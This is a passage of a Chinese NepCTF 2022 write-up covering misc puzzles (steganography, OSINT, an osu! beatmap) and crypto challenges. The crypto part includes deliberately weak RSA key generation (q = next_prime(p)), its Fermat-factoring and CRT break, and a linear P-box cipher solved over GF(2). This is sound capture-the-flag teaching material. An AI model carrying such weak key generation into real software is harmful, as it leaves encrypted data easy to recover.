class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到 <code>welcometonepctf2nd</code>，加分隔符得flag：<code>nepctf&#123;welcome_to_nepctf_2nd&#125;</code>。</p><p>​    </p><h3 id="花花画画画花花"><a href="#花花画画画花花" class="headerlink" title="花花画画画花花"></a>花花画画画花花</h3><blockquote><p>花花画了一张图，你能看出来她画的是什么吗</p><p>(flag格式为NepCTF{})</p></blockquote><p>在 <a href="https://osu.ppy.sh/wiki/zh/Client/File_formats">osu! wiki</a> 可以发现osz文件为可执行的osu!谱面文件，下载安装osu!，</p><p>根据 <code>生成的 .osz 文件会被放置在 osu! 文件夹下的 &quot;Exports&quot; 文件夹里</code>，将osz文件放入 <code>Exports</code> 文件夹，打开osu!，</p><p>在Edit页面看完整首歌曲的乐谱轨迹，拿到flag：<code>NepCTF&#123;MASTER_OF_坏女人！&#125;</code>。</p><p>​    </p><h3 id="少见的bbbbase"><a href="#少见的bbbbase" class="headerlink" title="少见的bbbbase"></a>少见的bbbbase</h3><blockquote><p>少见的bbbbase</p></blockquote><p>尝试几种常见jpg隐写，发现是jphide隐写，用JPHS工具seek（无密码），得到 <code>KkYWdvCQcLYewSUUy5TtQc9AMa</code></p><p>base58解得flag：<code>flag&#123;Real_qiandao~&#125;</code>。</p><p>​    </p><h3 id="9点直播"><a href="#9点直播" class="headerlink" title="9点直播"></a>9点直播</h3><blockquote><p>各位同学，比赛已经开始将近十个小时啦，大家玩的如何呢？邀请大家9点来直播间聊聊天~ 请锁定<a href="https://b23.tv/bn0pPAR">https://b23.tv/bn0pPAR</a><br>这边小助手收到了大家想暴打出题人的反馈，今晚9点我们请到了变态的出题人们，在直播间和大家交流，放出我们的hint，帮助大家解题。<br>同时也会在直播间中抽幸运的小伙伴送出我们的周边礼品。</p></blockquote><p>看B站直播拿flag：<code>NepCTF&#123;bad_woman_nb!&#125;</code>。</p><p>​    </p><h3 id="馅饼？陷阱！"><a href="#馅饼？陷阱！" class="headerlink" title="馅饼？陷阱！"></a>馅饼？陷阱！</h3><blockquote><p>好兄弟中奖了，但是要先汇款。他去哪了？</p><p>NepCTF{银行官网网址}</p></blockquote><p>OSINT题。</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717235016617.png" alt="image-20220717235016617"></p><p>用Yandex识别图1里的黄色建筑，可得到结果为<strong>豪威海景大酒店</strong>，再在百度地图里搜索在海南三亚，附近银行为<strong>光大银行</strong>，</p><p>官网网址即flag：<code>NepCTF&#123;www.cebbank.com&#125;</code>。</p><p>​    </p><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><blockquote><p><a href="https://www.wjx.cn/vm/mjlLAVV.aspx">https://www.wjx.cn/vm/mjlLAVV.aspx</a></p></blockquote><p>答问卷暴打出题人，拿flag：<code>NepCTF&#123;see_you_NepCTF_2023&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>Have you heard of the Chinese Remainder Theorem?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,is_prime,invert,bit_length, next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    (p,q,n,e,d) = (<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = next_prime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     q = p + 1</span></span><br><span class="line"><span class="comment">#     while(True):</span></span><br><span class="line"><span class="comment">#         q += 2 if q &amp; 1 else 1</span></span><br><span class="line"><span class="comment">#         if is_prime(q, 30):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    par = (p,q,n,e,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">par, c</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here&#x27;s something for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_p =&quot;</span>,c % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_q =&quot;</span>,c % q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">message, par</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">    c = powmod(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    par = gen_key()</span><br><span class="line">    c = enc(flag, par)</span><br><span class="line">    leak(par, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Here&#x27;s something for you.</span></span><br><span class="line"><span class="string">n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816</span></span><br><span class="line"><span class="string">c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解和CRT应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n =</span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n%q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">cp =</span><br><span class="line">cq =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = crt([cp,cq],[p,q])</span><br><span class="line">d = inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="p-or-s"><a href="#p-or-s" class="headerlink" title="p or s"></a>p or s</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>what are the differences between P and S？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(keys)==<span class="number">6</span>)</span><br><span class="line">Pbox=[</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">v</span>):</span><br><span class="line">    t=v</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">       q=[]</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> Pbox:</span><br><span class="line">           q.append(<span class="built_in">sum</span>([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> j])%<span class="number">2</span>)</span><br><span class="line">       t=[<span class="built_in">int</span>(q[j])^<span class="built_in">int</span>(i[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line">fb=<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="number">32</span>*<span class="number">8</span>)</span><br><span class="line">ciphertext=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fb),<span class="number">32</span>):</span><br><span class="line">    t=enc([<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> fb[i:i+<span class="number">32</span>]])</span><br><span class="line">    ciphertext+=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> t])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：将flag二进制32*8位01串分为8组，每一组都先经过P盒按位选择求和运算，再与未知的32位key进行按位异或运算，因为有6组key，上述两步运算循环进行6次操作，得到最终32位密文。</p><p>将加密过程转为 $\text{GF}(2)$ 下的矩阵运算，$M_i$ 为 1x32 明文矩阵 $(0 \le i \lt 8)$，$P$ 为 32x32 P盒矩阵，$K_i$ 为 1x32 key矩阵 $(0 \le i \lt 6)$，$T_i$ 为中间矩阵 $(0 \le i \lt 6)$，$C$ 为密文矩阵，即：</p><p>$T_0=M_i$</p><p>$T_1=T_0P^{-1}+K_0$</p><p>$T_2=T_1P^{-1}+K_1$</p><p>$T_3=T_2P^{-1}+K_2$</p><p>$T_4=T_3P^{-1}+K_3$</p><p>$T_5=T_4P^{-1}+K_4$</p><p>$T_6=T_5P^{-1}+K_5=C$</p><p>可得：</p><p>$C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$</p><p>由于 $K_i$ 和 $P$ 都固定，令 $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$，</p><p>有 $C=M_iA+B$，其中 $A,B$ 都为固定值，$A$ 可求，$B$ 未知。</p><p>猜测 $M_0$ 对应的明文是 <code>flag</code>，则由 $M_0,C_0$可以得出 $B$，再对 $C_1$ 至 $C_5$ 分别求逆运算可得 $M_1$ 至 $M_5$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 